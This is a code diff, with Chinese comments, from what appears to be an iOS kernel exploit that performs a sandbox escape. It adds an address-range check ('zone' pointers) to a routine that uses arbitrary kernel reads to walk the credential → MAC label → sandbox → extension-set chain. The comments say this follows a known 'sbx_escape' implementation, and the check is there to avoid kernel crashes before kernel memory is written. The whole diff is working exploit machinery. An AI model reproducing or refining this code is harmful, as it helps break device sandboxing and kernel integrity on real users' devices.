@@ -673,6 +673,17 @@ static uint64_t ds_discover_identities_v3(void)
 /// 为什么可以试多组 offset：起点是**已被 cr_uid 校验过的真 cred**（不是来路不明的字），
 /// 而且 label 有很强的结构签名——`l_perpolicy[0]`(AMFI) 与 `l_perpolicy[1]`(sandbox) 必须同时是内核指针；
 /// ext_set 还要能读出真正的 ext 链。三道都对上才认。
+/// zone（动态分配对象）段的地址闸门 —— 只用来**挡掉垃圾地址**，不解引用、零成本。
+///
+/// 实测观测到的 zone 段范围（多次启动）：0xffffffde… / 0xffffffdf… / 0xffffffe2… / 0xffffffe5…，
+/// 而内核静态段在 0xfffffff0… 以上、`0xffffffff…` 之类多为垃圾值。
+/// 所以把「链路三跳要解引用的地址」限制在 0xffffffc0…0xffffffef 之间：
+/// 既覆盖真实 zone 对象，又能拦住会把内核读崩的垃圾指针。
+static inline bool ds_is_zone_ptr(uint64_t address)
+{
+    return address >= 0xFFFFFFC000000000ULL && address < 0xFFFFFFF000000000ULL;
+}
+
 /// 单路解析（与 lara pe/sbx.m 的 sbx_escape 完全一致）：
 ///   cred →(0x78) label →(+0x10) sandbox →(+0x10) ext_set
 /// 每跳只做一次解引用、只做一种指针还原，没有任何扫描或候选试探。
@@ -680,8 +691,8 @@ static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 {
     uint64_t rawLabel = ds_kread_safe(cred + DS_OFF_UCRED_CR_LABEL);
     uint64_t label = ds_normalize_ptr(rawLabel);
-    if (!ds_is_kptr(label)) {
-        ds_log("[逃逸] cred+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手（不写内核内存）",
+    if (!ds_is_kptr(label) || !ds_is_zone_ptr(label)) {
+        ds_log("[逃逸] cred+0x%llx = 0x%llx → 还原后 0x%llx 不是 zone 地址，停手（不写内核内存）",
                (unsigned long long)DS_OFF_UCRED_CR_LABEL,
                (unsigned long long)rawLabel, (unsigned long long)label);
         return 0;
@@ -689,8 +700,8 @@ static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 
     uint64_t rawSandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
     uint64_t sandbox = ds_normalize_ptr(rawSandbox);
-    if (!ds_is_kptr(sandbox)) {
-        ds_log("[逃逸] label=0x%llx，label+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
+    if (!ds_is_kptr(sandbox) || !ds_is_zone_ptr(sandbox)) {
+        ds_log("[逃逸] label=0x%llx，label+0x%llx = 0x%llx → 还原后 0x%llx 不是 zone 地址，停手",
                (unsigned long long)label, (unsigned long long)DS_OFF_LABEL_SANDBOX,
                (unsigned long long)rawSandbox, (unsigned long long)sandbox);
         return 0;
@@ -698,8 +709,8 @@ static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 
     uint64_t rawExtSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
     uint64_t extSet = ds_normalize_ptr(rawExtSet);
-    if (!ds_is_kptr(extSet)) {
-        ds_log("[逃逸] sandbox=0x%llx，sandbox+0x%llx = 0x%llx → 还原后 0x%llx 不是内核指针，停手",
+    if (!ds_is_kptr(extSet) || !ds_is_zone_ptr(extSet)) {
+        ds_log("[逃逸] sandbox=0x%llx，sandbox+0x%llx = 0x%llx → 还原后 0x%llx 不是 zone 地址，停手",
                (unsigned long long)sandbox, (unsigned long long)DS_OFF_SANDBOX_EXT_SET,
                (unsigned long long)rawExtSet, (unsigned long long)extSet);
         return 0;
